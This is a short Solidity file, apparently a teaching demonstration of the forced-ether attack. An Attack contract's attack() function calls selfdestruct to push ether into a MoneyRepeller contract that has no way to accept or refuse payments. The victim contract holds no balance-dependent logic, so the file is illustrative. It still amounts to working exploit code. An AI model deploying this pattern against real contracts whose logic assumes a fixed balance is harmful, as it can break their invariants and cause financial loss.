// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract MoneyRepeller { 
    function getBalance() public view returns(uint) { 
    return address(this).balance; 
    } 
} 

contract Attack {
    MoneyRepeller moneyRepeller;

    constructor(MoneyRepeller _moneyRepeller) {
        moneyRepeller = MoneyRepeller(_moneyRepeller);
    }
    function attack() public payable {
        address payable addr = payable(address(moneyRepeller));
        selfdestruct(addr);
    }
}
